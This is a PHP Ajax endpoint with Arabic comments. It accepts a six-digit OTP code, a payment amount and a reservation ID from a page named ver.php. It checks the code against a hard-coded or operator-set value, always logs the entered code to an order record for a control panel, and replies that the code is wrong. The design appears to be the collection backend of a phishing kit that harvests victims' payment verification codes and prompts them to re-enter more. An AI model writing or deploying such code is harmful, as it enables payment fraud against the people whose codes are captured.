<?php
/**
 * استقبال رمز OTP من صفحة ver.php (Ajax) — يُحفظ دائماً في الطلب للوحة التحكم
 */

declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
	http_response_code(405);
	echo json_encode(['success' => false, 'message' => 'Method not allowed'], JSON_UNESCAPED_UNICODE);
	exit;
}

$raw = file_get_contents('php://input');
$body = json_decode($raw ?: '[]', true);
if (!is_array($body)) {
	$body = $_POST;
}

$orderId = isset($body['farm_order_id']) ? preg_replace('/[^\d]/', '', (string) $body['farm_order_id']) : '';
$code = isset($body['code']) ? preg_replace('/\D/', '', (string) $body['code']) : '';
$amount = isset($body['amount']) ? (string) $body['amount'] : '';
$reservationId = isset($body['reservation_id']) ? (string) $body['reservation_id'] : '';

if ($orderId === '') {
	http_response_code(400);
	echo json_encode(['success' => false, 'message' => 'معرّف الطلب مفقود'], JSON_UNESCAPED_UNICODE);
	exit;
}

if (strlen($code) !== 6) {
	http_response_code(400);
	echo json_encode(['success' => false, 'message' => 'يرجى إدخال رمز مكوّن من 6 أرقام.', 'valid' => false], JSON_UNESCAPED_UNICODE);
	exit;
}

$projectRoot = dirname(dirname(dirname(__DIR__)));
$farm_ver_expected_otp = '123456';
$otpCfgPath = $projectRoot . '/farm_ver_phone_otp.php';
if (is_file($otpCfgPath)) {
	$otpCfg = include $otpCfgPath;
	if (is_string($otpCfg) && preg_match('/^\d{6}$/', $otpCfg)) {
		$farm_ver_expected_otp = $otpCfg;
	} elseif (is_array($otpCfg) && !empty($otpCfg['otp']) && preg_match('/^\d{6}$/', (string) $otpCfg['otp'])) {
		$farm_ver_expected_otp = (string) $otpCfg['otp'];
	}
}

$valid = ($code === $farm_ver_expected_otp);

$appendFlowPath = $projectRoot . '/append_order_flow.php';
if (!is_file($appendFlowPath)) {
	http_response_code(500);
	echo json_encode(['success' => false, 'message' => 'تعذّر حفظ البيانات'], JSON_UNESCAPED_UNICODE);
	exit;
}

require_once $appendFlowPath;

if (!function_exists('farm_append_order_flow')) {
	http_response_code(500);
	echo json_encode(['success' => false, 'message' => 'نظام الحفظ غير متوفر'], JSON_UNESCAPED_UNICODE);
	exit;
}

$ok = farm_append_order_flow($orderId, 'ver_phone_otp', [
	'otp_code' => $code,
	'otp_valid' => $valid,
	'amount' => $amount,
	'reservation_id' => $reservationId,
]);

if (!$ok) {
	http_response_code(404);
	echo json_encode(['success' => false, 'message' => 'الطلب غير موجود أو تعذّر الحفظ'], JSON_UNESCAPED_UNICODE);
	exit;
}

$wrongMsg = 'رمز التحقق OTP الذي أدخلته خاطئ٬ يرجى إعادة إدخال الرمز والمحاولة مرة أخرى';

echo json_encode([
	'success' => true,
	'valid' => $valid,
	'message' => $valid ? '' : $wrongMsg,
], JSON_UNESCAPED_UNICODE);
